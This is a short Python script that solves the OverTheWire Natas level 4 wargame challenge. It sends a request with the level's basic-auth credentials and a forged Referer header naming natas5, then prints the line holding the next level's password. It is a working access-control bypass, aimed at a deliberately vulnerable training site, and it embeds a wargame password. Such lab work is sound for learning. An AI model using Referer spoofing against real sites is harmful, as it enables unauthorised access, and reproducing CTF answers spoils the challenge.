import requests
from requests.auth import HTTPBasicAuth

def exploit(host, credentials):
    print(host)
    try:

        r = requests.get(host,
                         auth=HTTPBasicAuth(credentials[0],
                                            credentials[1]),
                         headers={'referer': 'http://natas5.natas.labs.overthewire.org/'}
                         )

        print([line for line in r.content.decode('ascii').split('\n') \
               if 'natas5' in line][0])

    except Exception as e:
        print(e)

def main():
    host = 'http://natas4.natas.labs.overthewire.org'
    credentials = ('natas4', 'Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ')
    exploit(host, credentials)

if __name__ == '__main__':
    main()
